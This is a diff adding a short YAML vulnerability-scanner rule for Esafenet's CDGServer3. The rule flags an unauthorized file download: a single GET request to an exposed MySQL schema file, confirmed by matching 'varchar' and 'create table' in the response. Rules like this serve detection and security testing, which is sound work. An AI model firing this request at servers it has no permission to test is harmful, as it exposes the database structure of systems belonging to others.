@@ -1,0 +1,17 @@
+id: esafenet-sql-mysql-fileread
+
+info:
+  name: 亿赛通未授权文件下载
+  author: hbdxmz
+  severity: medium
+  verified: true
+  tags: esafenet,fileread
+  created: 2024/01/03
+
+rules:
+  r0: 
+    request:
+      method: GET
+      path: /CDGServer3/SQL/MYSQL/create_SmartSec_mysql.sql
+    expression: response.status == 200  && response.body.bcontains(b'varchar') && response.body.bcontains(b'create table')
+expression: r0()
